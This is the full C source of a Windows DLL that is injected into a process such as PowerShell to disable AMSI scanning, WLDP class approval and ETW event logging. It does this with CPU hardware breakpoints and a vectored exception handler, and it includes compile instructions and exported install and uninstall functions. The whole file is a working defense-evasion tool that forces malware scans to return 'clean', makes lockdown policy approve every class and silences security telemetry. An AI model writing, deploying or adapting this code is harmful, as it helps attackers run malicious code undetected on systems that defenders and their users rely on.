/*
 * HWBP AMSI + WLDP + ETW Bypass - DLL version
 *
 * Compile with Intel oneAPI DPC++/C++ Compiler:
 *   icx.exe /nologo /O3 /MT /EHsc "mora_hwbp.c" /link /DLL /out:"mora_hwbp.dll" /LIBPATH:"C:\Program Files (x86)\Intel\oneAPI\compiler\latest\lib"
 *
 * This DLL, once injected into a process (e.g. PowerShell), will use ONLY
 * Hardware Breakpoints (CPU Debug Registers) to hook:
 *   - DR0: AmsiScanBuffer  (AMSI)
 *   - DR1: AmsiScanString  (AMSI)
 *   - DR2: WldpIsClassInApprovedList (WLDP)
 *   - DR3: EtwEventWrite   (ETW)
 *
 * ZERO memory patching - all via CPU debug registers + VEH.
 */

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/* ------------------------------------------------------------------ */
/*  Constants & Types                                                  */
/* ------------------------------------------------------------------ */

#define AMSI_RESULT_CLEAN     0
#define AMSI_RESULT_DETECTED  32768

/* AMSI */
typedef HRESULT (WINAPI *fnAmsiScanBuffer)(
    HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, PVOID);

typedef HRESULT (WINAPI *fnAmsiScanString)(
    HANDLE, LPCWSTR, LPCWSTR, HANDLE, PVOID);

/* WLDP (Windows Lockdown Policy / Device Guard) */
typedef HRESULT (WINAPI *fnWldpIsClassInApprovedList)(
    const GUID *classId, PBOOL isApproved, DWORD evalCriteria);

/* ETW (Event Tracing for Windows) - same calling convention in x64 */
typedef ULONG (WINAPI *fnEtwEventWrite)(
    HANDLE RegHandle, PVOID EventDescriptor,
    ULONG UserDataCount, PVOID UserData);

/* ------------------------------------------------------------------ */
/*  Globals                                                            */
/* ------------------------------------------------------------------ */

/* AMSI */
static fnAmsiScanBuffer  g_AmsiScanBuffer  = NULL;
static fnAmsiScanString  g_AmsiScanString  = NULL;

/* WLDP */
static fnWldpIsClassInApprovedList g_WldpIsClassInApprovedList = NULL;

/* ETW */
static fnEtwEventWrite   g_EtwEventWrite   = NULL;

/* Control */
static PVOID            g_VehHandle       = NULL;
static HANDLE           g_hMonitorThread  = NULL;
static volatile LONG    g_Running         = 1;
static CRITICAL_SECTION g_HookLock;

/* Track which functions are actually available to hook */
static volatile LONG    g_HaveAmsiBuf     = 0;
static volatile LONG    g_HaveAmsiStr     = 0;
static volatile LONG    g_HaveWldp        = 0;
static volatile LONG    g_HaveEtw         = 0;

/* ------------------------------------------------------------------ */
/*  Hardware Breakpoint Helpers                                        */
/* ------------------------------------------------------------------ */

BOOL SetHwbpOnThread(HANDLE hThread)
{
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) return FALSE;

    /* Clear all debug registers first */
    ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0;
    ctx.Dr7 = 0;

    /* ---- DR0 = AmsiScanBuffer ---- */
    if (g_AmsiScanBuffer)
    {
        ctx.Dr0 = (DWORD64)(ULONG_PTR)g_AmsiScanBuffer;
        ctx.Dr7 |= (1 << 0);          /* L0 = 1 (local enable) */
        ctx.Dr7 &= ~((DWORD64)3 << 16); /* R/W0 = 00 (execution) */
        ctx.Dr7 &= ~((DWORD64)3 << 18); /* Len0 = 00 (1 byte)   */
    }

    /* ---- DR1 = AmsiScanString ---- */
    if (g_AmsiScanString)
    {
        ctx.Dr1 = (DWORD64)(ULONG_PTR)g_AmsiScanString;
        ctx.Dr7 |= (1 << 2);          /* L1 = 1 */
        ctx.Dr7 &= ~((DWORD64)3 << 20); /* R/W1 = 00 */
        ctx.Dr7 &= ~((DWORD64)3 << 22); /* Len1 = 00 */
    }

    /* ---- DR2 = WldpIsClassInApprovedList ---- */
    if (g_WldpIsClassInApprovedList)
    {
        ctx.Dr2 = (DWORD64)(ULONG_PTR)g_WldpIsClassInApprovedList;
        ctx.Dr7 |= (1 << 4);          /* L2 = 1 */
        ctx.Dr7 &= ~((DWORD64)3 << 24); /* R/W2 = 00 */
        ctx.Dr7 &= ~((DWORD64)3 << 26); /* Len2 = 00 */
    }

    /* ---- DR3 = EtwEventWrite ---- */
    if (g_EtwEventWrite)
    {
        ctx.Dr3 = (DWORD64)(ULONG_PTR)g_EtwEventWrite;
        ctx.Dr7 |= (1 << 6);          /* L3 = 1 */
        ctx.Dr7 &= ~((DWORD64)3 << 28); /* R/W3 = 00 */
        ctx.Dr7 &= ~((DWORD64)3 << 30); /* Len3 = 00 */
    }

    /* LE + GE for backwards compatibility */
    ctx.Dr7 |= (1 << 8) | (1 << 9);

    return SetThreadContext(hThread, &ctx);
}

BOOL ClearHwbpOnThread(HANDLE hThread)
{
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) return FALSE;
    ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0;
    ctx.Dr7 = 0;
    return SetThreadContext(hThread, &ctx);
}

/* ------------------------------------------------------------------ */
/*  Vectored Exception Handler                                         */
/* ------------------------------------------------------------------ */

LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD64 excAddr = (DWORD64)ep->ExceptionRecord->ExceptionAddress;
    DWORD64 rsp;

    /* ============================================================== */
    /*  DR0: AmsiScanBuffer                                            */
    /* ============================================================== */
    if (g_AmsiScanBuffer &&
        excAddr == (DWORD64)(ULONG_PTR)g_AmsiScanBuffer)
    {
        rsp = ep->ContextRecord->Rsp;
        __try
        {
            /* 6th param (result) at [RSP+0x30] */
            PVOID *ppResult = (PVOID *)(rsp + 0x30);
            PVOID  pResult  = *ppResult;
            if (pResult) *(DWORD *)pResult = AMSI_RESULT_CLEAN;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {}

        ep->ContextRecord->Rax = 0;          /* S_OK */
        ep->ContextRecord->Rip = *(DWORD64 *)rsp;  /* return address */
        ep->ContextRecord->Rsp = rsp + 8;         /* pop return addr */
        ep->ContextRecord->Dr6 &= ~0xF;           /* clear breakpoint flags */
        InterlockedIncrement(&g_HaveAmsiBuf);     /* increment hit counter */
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ============================================================== */
    /*  DR1: AmsiScanString                                            */
    /* ============================================================== */
    if (g_AmsiScanString &&
        excAddr == (DWORD64)(ULONG_PTR)g_AmsiScanString)
    {
        rsp = ep->ContextRecord->Rsp;
        __try
        {
            /* 5th param (result) at [RSP+0x28] */
            PVOID *ppResult = (PVOID *)(rsp + 0x28);
            PVOID  pResult  = *ppResult;
            if (pResult) *(DWORD *)pResult = AMSI_RESULT_CLEAN;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {}

        ep->ContextRecord->Rax = 0;
        ep->ContextRecord->Rip = *(DWORD64 *)rsp;
        ep->ContextRecord->Rsp = rsp + 8;
        ep->ContextRecord->Dr6 &= ~0xF;
        InterlockedIncrement(&g_HaveAmsiStr);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ============================================================== */
    /*  DR2: WldpIsClassInApprovedList                                  */
    /* ============================================================== */
    /*
     * Signature:
     *   HRESULT WldpIsClassInApprovedList(
     *       const GUID *classId,    // RCX
     *       PBOOL       isApproved, // RDX -> set *isApproved = TRUE
     *       DWORD       evalCriteria // R8
     *   );
     *
     * We set *isApproved = TRUE and return S_OK (0).
     * This makes WLDP think the content class is approved, which
     * makes AMSI skip scanning since it trusts WLDP's judgement.
     */
    if (g_WldpIsClassInApprovedList &&
        excAddr == (DWORD64)(ULONG_PTR)g_WldpIsClassInApprovedList)
    {
        rsp = ep->ContextRecord->Rsp;
        __try
        {
            /* RDX = isApproved (PBOOL) - write TRUE */
            PBOOL pApproved = (PBOOL)ep->ContextRecord->Rdx;
            if (pApproved) *pApproved = TRUE;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {}

        ep->ContextRecord->Rax = 0;          /* S_OK */
        ep->ContextRecord->Rip = *(DWORD64 *)rsp;
        ep->ContextRecord->Rsp = rsp + 8;
        ep->ContextRecord->Dr6 &= ~0xF;
        InterlockedIncrement(&g_HaveWldp);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ============================================================== */
    /*  DR3: EtwEventWrite                                             */
    /* ============================================================== */
    /*
     * Signature:
     *   ULONG EtwEventWrite(
     *       HANDLE  RegHandle,       // RCX
     *       PVOID   EventDescriptor, // RDX
     *       ULONG   UserDataCount,   // R8
     *       PVOID   UserData         // R9
     *   );
     *
     * We just return 0 (ERROR_SUCCESS) without executing the function.
     * This prevents ETW from logging events like:
     *   - PowerShell pipeline execution
     *   - .NET assembly load
     *   - AMSI scan results
     *   - Process creation, etc.
     */
    if (g_EtwEventWrite &&
        excAddr == (DWORD64)(ULONG_PTR)g_EtwEventWrite)
    {
        rsp = ep->ContextRecord->Rsp;

        /* Just return success - no output params to modify */
        ep->ContextRecord->Rax = 0;          /* ERROR_SUCCESS */
        ep->ContextRecord->Rip = *(DWORD64 *)rsp;
        ep->ContextRecord->Rsp = rsp + 8;
        ep->ContextRecord->Dr6 &= ~0xF;
        InterlockedIncrement(&g_HaveEtw);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ------------------------------------------------------------------ */
/*  Thread Management                                                  */
/* ------------------------------------------------------------------ */

void HookAllThreads(void)
{
    DWORD  pid = GetCurrentProcessId();
    DWORD  tid = GetCurrentThreadId();
    HANDLE hs;
    THREADENTRY32 te;

    EnterCriticalSection(&g_HookLock);
    SetHwbpOnThread(GetCurrentThread());

    hs = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hs == INVALID_HANDLE_VALUE) { LeaveCriticalSection(&g_HookLock); return; }

    te.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hs, &te))
    {
        do {
            if (te.th32OwnerProcessID == pid && te.th32ThreadID != tid)
            {
                HANDLE hThread = OpenThread(
                    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                    THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME,
                    FALSE, te.th32ThreadID);
                if (hThread)
                {
                    SuspendThread(hThread);
                    SetHwbpOnThread(hThread);
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                }
            }
            te.dwSize = sizeof(THREADENTRY32);
        } while (Thread32Next(hs, &te));
    }
    CloseHandle(hs);
    LeaveCriticalSection(&g_HookLock);
}

DWORD WINAPI MonitorThreadProc(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    while (g_Running) { Sleep(500); HookAllThreads(); }
    return 0;
}

/* ------------------------------------------------------------------ */
/*  Helper to output debug info                                        */
/* ------------------------------------------------------------------ */

void PrintDebugInfo(void)
{
    char buf[1024];
    int  n = 0;

    n += sprintf(buf + n, "[HWBP] === Hook Status ===\n");

    if (g_AmsiScanBuffer)
        n += sprintf(buf + n, "[HWBP] DR0: AmsiScanBuffer      @ 0x%p (%ld hits)\n",
                     (void *)g_AmsiScanBuffer, g_HaveAmsiBuf);
    else
        n += sprintf(buf + n, "[HWBP] DR0: AmsiScanBuffer      [NOT FOUND]\n");

    if (g_AmsiScanString)
        n += sprintf(buf + n, "[HWBP] DR1: AmsiScanString      @ 0x%p (%ld hits)\n",
                     (void *)g_AmsiScanString, g_HaveAmsiStr);
    else
        n += sprintf(buf + n, "[HWBP] DR1: AmsiScanString      [NOT FOUND]\n");

    if (g_WldpIsClassInApprovedList)
        n += sprintf(buf + n, "[HWBP] DR2: WldpIsClassInApprovedList @ 0x%p (%ld hits)\n",
                     (void *)g_WldpIsClassInApprovedList, g_HaveWldp);
    else
        n += sprintf(buf + n, "[HWBP] DR2: WldpIsClassInApprovedList [NOT FOUND]\n");

    if (g_EtwEventWrite)
        n += sprintf(buf + n, "[HWBP] DR3: EtwEventWrite       @ 0x%p (%ld hits)\n",
                     (void *)g_EtwEventWrite, g_HaveEtw);
    else
        n += sprintf(buf + n, "[HWBP] DR3: EtwEventWrite       [NOT FOUND]\n");

    n += sprintf(buf + n, "[HWBP] VEH: %s\n",
                 g_VehHandle ? "REGISTERED" : "NOT REGISTERED");
    n += sprintf(buf + n, "[HWBP] Monitor: %s\n",
                 g_hMonitorThread ? "RUNNING" : "STOPPED");

    OutputDebugStringA(buf);
}

/* ------------------------------------------------------------------ */
/*  DLL Entry / Public API                                            */
/* ------------------------------------------------------------------ */

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    HMODULE hAmsi, hWldp, hNtdll;

    UNREFERENCED_PARAMETER(hInst);
    UNREFERENCED_PARAMETER(reserved);

    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hInst);

        /*
         * ---- Resolve AMSI functions ----
         * amsi.dll should already be loaded in the target process
         * (e.g. PowerShell), but load it just in case.
         */
        hAmsi = GetModuleHandleW(L"amsi.dll");
        if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
        if (hAmsi)
        {
            g_AmsiScanBuffer = (fnAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
            g_AmsiScanString = (fnAmsiScanString)GetProcAddress(hAmsi, "AmsiScanString");
        }

        /*
         * ---- Resolve WLDP functions ----
         * wldp.dll (Windows Lockdown Policy) may or may not be loaded yet.
         * We load it to get the function addresses.
         */
        hWldp = GetModuleHandleW(L"wldp.dll");
        if (!hWldp) hWldp = LoadLibraryW(L"wldp.dll");
        if (hWldp)
        {
            g_WldpIsClassInApprovedList = (fnWldpIsClassInApprovedList)
                GetProcAddress(hWldp, "WldpIsClassInApprovedList");
        }

        /*
         * ---- Resolve ETW functions ----
         * ntdll.dll is ALWAYS loaded in every process.
         * EtwEventWrite is the main ETW logging function.
         */
        hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll)
        {
            g_EtwEventWrite = (fnEtwEventWrite)
                GetProcAddress(hNtdll, "EtwEventWrite");
        }

        /* We need at least ONE thing to hook to be useful */
        if (!g_AmsiScanBuffer && !g_AmsiScanString &&
            !g_WldpIsClassInApprovedList && !g_EtwEventWrite)
        {
            OutputDebugStringW(L"[HWBP] No target functions found - nothing to hook!\n");
            return TRUE; /* Don't fail load, just don't hook */
        }

        /* Initialize synchronization */
        InitializeCriticalSection(&g_HookLock);

        /* Register VEH */
        g_VehHandle = AddVectoredExceptionHandler(1, VectoredHandler);
        if (!g_VehHandle)
        {
            OutputDebugStringW(L"[HWBP] AddVectoredExceptionHandler FAILED\n");
            DeleteCriticalSection(&g_HookLock);
            return TRUE;
        }

        /* Hook current thread */
        SetHwbpOnThread(GetCurrentThread());

        /* Hook all existing threads */
        HookAllThreads();

        /* Start monitor thread to catch new threads */
        g_hMonitorThread = CreateThread(NULL, 0, MonitorThreadProc, NULL, 0, NULL);

        PrintDebugInfo();
    }
    else if (reason == DLL_PROCESS_DETACH)
    {
        InterlockedExchange(&g_Running, 0);
        if (g_hMonitorThread)
        {
            WaitForSingleObject(g_hMonitorThread, 2000);
            CloseHandle(g_hMonitorThread);
        }
        if (g_VehHandle)
            RemoveVectoredExceptionHandler(g_VehHandle);
        DeleteCriticalSection(&g_HookLock);
    }
    return TRUE;
}

/* ---- Export: InstallHook ---- */
__declspec(dllexport) BOOL WINAPI InstallHook(void)
{
    HMODULE hAmsi, hWldp, hNtdll;

    /* Load AMSI */
    hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (hAmsi)
    {
        g_AmsiScanBuffer = (fnAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
        g_AmsiScanString = (fnAmsiScanString)GetProcAddress(hAmsi, "AmsiScanString");
    }

    /* Load WLDP */
    hWldp = GetModuleHandleW(L"wldp.dll");
    if (!hWldp) hWldp = LoadLibraryW(L"wldp.dll");
    if (hWldp)
    {
        g_WldpIsClassInApprovedList = (fnWldpIsClassInApprovedList)
            GetProcAddress(hWldp, "WldpIsClassInApprovedList");
    }

    /* Load ETW */
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll)
    {
        g_EtwEventWrite = (fnEtwEventWrite)
            GetProcAddress(hNtdll, "EtwEventWrite");
    }

    if (!g_AmsiScanBuffer && !g_AmsiScanString &&
        !g_WldpIsClassInApprovedList && !g_EtwEventWrite)
        return FALSE;

    InitializeCriticalSection(&g_HookLock);

    g_VehHandle = AddVectoredExceptionHandler(1, VectoredHandler);
    if (!g_VehHandle) { DeleteCriticalSection(&g_HookLock); return FALSE; }

    SetHwbpOnThread(GetCurrentThread());
    HookAllThreads();
    g_hMonitorThread = CreateThread(NULL, 0, MonitorThreadProc, NULL, 0, NULL);

    PrintDebugInfo();
    return TRUE;
}

/* ---- Export: UninstallHook ---- */
__declspec(dllexport) BOOL WINAPI UninstallHook(void)
{
    InterlockedExchange(&g_Running, 0);
    if (g_hMonitorThread)
    {
        WaitForSingleObject(g_hMonitorThread, 2000);
        CloseHandle(g_hMonitorThread);
        g_hMonitorThread = NULL;
    }

    /* Clear breakpoints on all threads */
    {
        HANDLE hs; THREADENTRY32 te;
        hs = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hs != INVALID_HANDLE_VALUE)
        {
            te.dwSize = sizeof(THREADENTRY32);
            if (Thread32First(hs, &te))
            {
                do {
                    if (te.th32OwnerProcessID == GetCurrentProcessId())
                    {
                        HANDLE hThread = OpenThread(
                            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
                            THREAD_QUERY_INFORMATION,
                            FALSE, te.th32ThreadID);
                        if (hThread)
                        {
                            ClearHwbpOnThread(hThread);
                            CloseHandle(hThread);
                        }
                    }
                    te.dwSize = sizeof(THREADENTRY32);
                } while (Thread32Next(hs, &te));
            }
            CloseHandle(hs);
        }
    }

    if (g_VehHandle)
    {
        RemoveVectoredExceptionHandler(g_VehHandle);
        g_VehHandle = NULL;
    }
    DeleteCriticalSection(&g_HookLock);
    return TRUE;
}

/* ---- Export: GetStats ---- */
__declspec(dllexport) void WINAPI GetStats(void)
{
    PrintDebugInfo();
}
